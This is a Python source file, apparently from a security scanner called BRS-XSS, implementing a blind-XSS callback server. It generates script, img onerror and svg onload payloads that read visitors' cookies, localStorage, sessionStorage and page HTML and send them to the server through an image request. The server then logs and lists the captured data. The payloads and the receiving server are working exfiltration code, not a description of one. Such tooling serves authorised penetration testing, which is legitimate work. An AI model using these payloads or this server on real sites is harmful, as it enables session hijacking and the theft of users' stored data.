#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: Thu 26 Dec 2025 20:45:00 UTC
Status: Created

Callback Server for Blind XSS detection.
Receives callbacks from injected payloads to confirm execution.
"""

import json
import time
import uuid
import hashlib
from typing import Optional, Callable, Any
from dataclasses import dataclass, field
from datetime import datetime

from aiohttp import web

from brsxss.utils.logger import Logger

logger = Logger("core.callback_server")


@dataclass
class CallbackEvent:
    """Single callback event from Blind XSS payload"""

    id: str
    timestamp: float
    token: str  # Unique token identifying the payload

    # Request info
    source_ip: str = ""
    user_agent: str = ""
    referer: str = ""
    origin: str = ""

    # Payload data
    cookies: str = ""
    dom_content: str = ""
    location_href: str = ""
    local_storage: str = ""
    session_storage: str = ""

    # Custom data from payload
    custom_data: dict[str, Any] = field(default_factory=dict)

    # Scan correlation
    scan_id: Optional[str] = None
    target_url: Optional[str] = None
    parameter: Optional[str] = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "timestamp": self.timestamp,
            "datetime": datetime.fromtimestamp(self.timestamp).isoformat(),
            "token": self.token,
            "source_ip": self.source_ip,
            "user_agent": self.user_agent,
            "referer": self.referer,
            "origin": self.origin,
            "cookies": self.cookies[:500] if self.cookies else "",
            "location_href": self.location_href,
            "scan_id": self.scan_id,
            "target_url": self.target_url,
            "parameter": self.parameter,
        }


@dataclass
class PayloadToken:
    """Token tracking for correlating callbacks with scans"""

    token: str
    scan_id: str
    target_url: str
    parameter: str
    payload: str
    created_at: float

    def to_dict(self) -> dict[str, Any]:
        return {
            "token": self.token,
            "scan_id": self.scan_id,
            "target_url": self.target_url,
            "parameter": self.parameter,
            "created_at": self.created_at,
        }


class CallbackServer:
    """
    HTTP server for receiving Blind XSS callbacks.

    Usage:
    1. Start server on a public endpoint
    2. Generate payloads with callback URL
    3. Inject payloads into target
    4. Wait for callbacks confirming execution
    """

    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 9999,
        callback_path: str = "/c",
        on_callback: Optional[Callable[[CallbackEvent], None]] = None,
    ):
        """
        Initialize callback server.

        Args:
            host: Host to bind to
            port: Port to listen on
            callback_path: URL path for callbacks
            on_callback: Function called when callback received
        """
        self.host = host
        self.port = port
        self.callback_path = callback_path
        self.on_callback = on_callback

        # Storage
        self.tokens: dict[str, PayloadToken] = {}
        self.callbacks: list[CallbackEvent] = []

        # Server state
        self.app: Optional[web.Application] = None
        self.runner: Optional[web.AppRunner] = None
        self.site: Optional[web.TCPSite] = None
        self.is_running = False

        # Statistics
        self.total_callbacks = 0
        self.unique_tokens: set[str] = set()

        logger.info(f"Callback server initialized on {host}:{port}")

    def generate_token(
        self, scan_id: str, target_url: str, parameter: str, payload: str
    ) -> str:
        """
        Generate unique token for payload tracking.

        Args:
            scan_id: Associated scan ID
            target_url: Target URL being tested
            parameter: Parameter being tested
            payload: The payload being used

        Returns:
            Unique token string
        """
        # Create deterministic but unique token
        data = f"{scan_id}:{target_url}:{parameter}:{payload}:{time.time()}"
        token = hashlib.sha256(data.encode()).hexdigest()[:16]

        # Store token info
        self.tokens[token] = PayloadToken(
            token=token,
            scan_id=scan_id,
            target_url=target_url,
            parameter=parameter,
            payload=payload,
            created_at=time.time(),
        )

        return token

    def generate_payload(self, token: str, callback_url: Optional[str] = None) -> str:
        """
        Generate Blind XSS payload with callback.

        Args:
            token: Unique tracking token
            callback_url: Full callback URL (if None, uses server URL)

        Returns:
            JavaScript payload string
        """
        if not callback_url:
            callback_url = f"http://{self.host}:{self.port}{self.callback_path}"

        # Payload that exfiltrates data back to callback server
        payload = f"""<script>
(function(){{
var d=document,w=window,n=navigator;
var data={{
t:"{token}",
c:d.cookie,
l:w.location.href,
r:d.referrer,
ls:JSON.stringify(localStorage),
ss:JSON.stringify(sessionStorage),
ua:n.userAgent,
h:d.documentElement.innerHTML.substring(0,1000)
}};
var i=new Image();
i.src="{callback_url}?d="+encodeURIComponent(JSON.stringify(data));
}})();
</script>"""

        return payload

    def generate_short_payload(
        self, token: str, callback_url: Optional[str] = None
    ) -> str:
        """Generate shorter payload for tight spaces"""
        if not callback_url:
            callback_url = f"http://{self.host}:{self.port}{self.callback_path}"

        return f"""<img src=x onerror="(new Image).src='{callback_url}?t={token}&c='+document.cookie">"""

    def generate_svg_payload(
        self, token: str, callback_url: Optional[str] = None
    ) -> str:
        """Generate SVG-based payload"""
        if not callback_url:
            callback_url = f"http://{self.host}:{self.port}{self.callback_path}"

        return f"""<svg onload="(new Image).src='{callback_url}?t={token}&c='+document.cookie">"""

    async def start(self):
        """Start the callback server"""
        if self.is_running:
            logger.warning("Callback server already running")
            return

        self.app = web.Application()
        self.app.router.add_get(self.callback_path, self._handle_callback)
        self.app.router.add_post(self.callback_path, self._handle_callback)
        self.app.router.add_get("/status", self._handle_status)
        self.app.router.add_get("/callbacks", self._handle_list_callbacks)

        self.runner = web.AppRunner(self.app)
        await self.runner.setup()

        self.site = web.TCPSite(self.runner, self.host, self.port)
        await self.site.start()

        self.is_running = True
        logger.info(f"Callback server started on http://{self.host}:{self.port}")

    async def stop(self):
        """Stop the callback server"""
        if not self.is_running:
            return

        if self.site:
            await self.site.stop()
        if self.runner:
            await self.runner.cleanup()

        self.is_running = False
        logger.info("Callback server stopped")

    async def _handle_callback(self, request: web.Request) -> web.Response:
        """Handle incoming callback from Blind XSS payload"""
        self.total_callbacks += 1

        try:
            # Extract data from request
            source_ip = request.remote or request.headers.get(
                "X-Forwarded-For", "unknown"
            )
            user_agent = request.headers.get("User-Agent", "")
            referer = request.headers.get("Referer", "")
            origin = request.headers.get("Origin", "")

            # Parse callback data
            token = ""
            cookies = ""
            location_href = ""
            local_storage = ""
            session_storage = ""
            custom_data = {}

            # Try to get data from query params
            if "d" in request.query:
                # Full data payload
                try:
                    data = json.loads(request.query["d"])
                    token = data.get("t", "")
                    cookies = data.get("c", "")
                    location_href = data.get("l", "")
                    local_storage = data.get("ls", "")
                    session_storage = data.get("ss", "")
                    custom_data = data
                except json.JSONDecodeError:
                    pass
            else:
                # Simple params
                token = request.query.get("t", "")
                cookies = request.query.get("c", "")

            # Create callback event
            event = CallbackEvent(
                id=str(uuid.uuid4())[:8],
                timestamp=time.time(),
                token=token,
                source_ip=source_ip or "",
                user_agent=user_agent,
                referer=referer,
                origin=origin,
                cookies=cookies,
                location_href=location_href,
                local_storage=local_storage,
                session_storage=session_storage,
                custom_data=custom_data,
            )

            # Correlate with scan if token known
            if token in self.tokens:
                token_info = self.tokens[token]
                event.scan_id = token_info.scan_id
                event.target_url = token_info.target_url
                event.parameter = token_info.parameter
                self.unique_tokens.add(token)

            # Store callback
            self.callbacks.append(event)

            # Notify listener
            if self.on_callback:
                try:
                    self.on_callback(event)
                except Exception as e:
                    logger.error(f"Error in callback handler: {e}")

            logger.warning(
                f"[BLIND XSS] Callback received! Token: {token}, IP: {source_ip}"
            )

            # Return transparent 1x1 GIF
            gif_bytes = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
            return web.Response(body=gif_bytes, content_type="image/gif")

        except Exception as e:
            logger.error(f"Error handling callback: {e}")
            return web.Response(status=500)

    async def _handle_status(self, request: web.Request) -> web.Response:
        """Return server status"""
        status = {
            "running": self.is_running,
            "total_callbacks": self.total_callbacks,
            "unique_tokens": len(self.unique_tokens),
            "registered_tokens": len(self.tokens),
            "stored_callbacks": len(self.callbacks),
        }
        return web.json_response(status)

    async def _handle_list_callbacks(self, request: web.Request) -> web.Response:
        """list recent callbacks"""
        limit = int(request.query.get("limit", 100))
        callbacks = [cb.to_dict() for cb in self.callbacks[-limit:]]
        return web.json_response(callbacks)

    def get_callbacks_for_scan(self, scan_id: str) -> list[CallbackEvent]:
        """Get all callbacks for a specific scan"""
        return [cb for cb in self.callbacks if cb.scan_id == scan_id]

    def get_callbacks_for_token(self, token: str) -> list[CallbackEvent]:
        """Get all callbacks for a specific token"""
        return [cb for cb in self.callbacks if cb.token == token]

    def has_callback(self, token: str) -> bool:
        """Check if callback received for token"""
        return any(cb.token == token for cb in self.callbacks)

    def get_statistics(self) -> dict[str, Any]:
        """Get server statistics"""
        return {
            "is_running": self.is_running,
            "total_callbacks": self.total_callbacks,
            "unique_tokens": len(self.unique_tokens),
            "registered_tokens": len(self.tokens),
            "stored_callbacks": len(self.callbacks),
            "endpoint": f"http://{self.host}:{self.port}{self.callback_path}",
        }

    def clear_callbacks(self):
        """Clear stored callbacks"""
        self.callbacks.clear()
        self.unique_tokens.clear()
        logger.info("Callbacks cleared")

    def clear_tokens(self):
        """Clear registered tokens"""
        self.tokens.clear()
        logger.info("Tokens cleared")


# Global callback server instance
_callback_server: Optional[CallbackServer] = None


def get_callback_server() -> CallbackServer:
    """Get or create global callback server instance"""
    global _callback_server
    if _callback_server is None:
        _callback_server = CallbackServer()
    return _callback_server


async def start_callback_server(
    host: str = "0.0.0.0",
    port: int = 9999,
    on_callback: Optional[Callable[[CallbackEvent], None]] = None,
) -> CallbackServer:
    """Start global callback server"""
    global _callback_server
    _callback_server = CallbackServer(host=host, port=port, on_callback=on_callback)
    await _callback_server.start()
    return _callback_server


async def stop_callback_server():
    """Stop global callback server"""
    global _callback_server
    if _callback_server:
        await _callback_server.stop()
        _callback_server = None
